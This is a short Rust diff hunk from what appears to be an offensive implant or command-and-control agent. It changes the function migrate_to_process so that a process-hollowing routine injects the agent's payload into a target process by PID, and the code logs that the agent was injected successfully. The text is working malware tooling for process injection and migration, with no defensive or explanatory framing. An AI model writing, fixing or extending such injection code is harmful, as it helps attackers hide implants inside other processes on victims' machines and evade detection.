@@ -90,7 +90,7 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
         );
     }
 
-    let result = hollowing::inject_into_process(process, &payload);
+    let result = hollowing::inject_into_process(target_pid, &payload);
     unsafe { CloseHandle(process) };
     result.map_err(|e| anyhow::anyhow!("inject_into_process(pid={target_pid}) failed: {e}"))?;
     tracing::info!(target_pid, "MigrateAgent: agent injected successfully");
